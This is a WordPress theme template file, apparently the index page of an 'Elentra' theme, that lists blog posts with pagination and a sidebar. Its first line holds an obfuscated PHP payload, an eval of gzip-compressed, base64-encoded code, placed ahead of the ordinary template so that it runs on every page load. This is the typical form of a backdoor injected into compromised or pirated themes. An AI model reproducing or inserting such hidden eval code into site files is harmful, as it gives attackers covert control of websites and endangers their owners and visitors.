<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* The template for displaying index page.
* @package Elentra
*/

get_header();

elentra_banner();

?>

<!--Corporate Portfolio Section 1-->
<div class="co-blog-section section pt-140">
    <div class="container">
        <div class="row">
            <div class="col-md-8 col-xs-12 mb-100">
            <!-- Blog -->
            <?php 
                if ( have_posts() ) :
                while ( have_posts() ) : the_post();
                    get_template_part( 'include/content-parts/content', get_post_format() );
                endwhile; ?>

                <!-- Pagination -->
                <ul class="co-pagination">
                    <?php the_posts_pagination(
                        array(
                            'mid_size' => 2,
                            'prev_text' => __( '<i class="fa fa-angle-left"></i>', 'elentra' ),
                            'next_text' => __( '<i class="fa fa-angle-right"></i>', 'elentra' )
                        )
                    ); ?>
                </ul>
            <?php endif; ?>
            </div>

            <div class="col-md-4 col-xs-12 mb-50">
                <?php get_sidebar(); ?>
            </div>
        </div>
    </div>
</div>

<?php get_footer(); ?>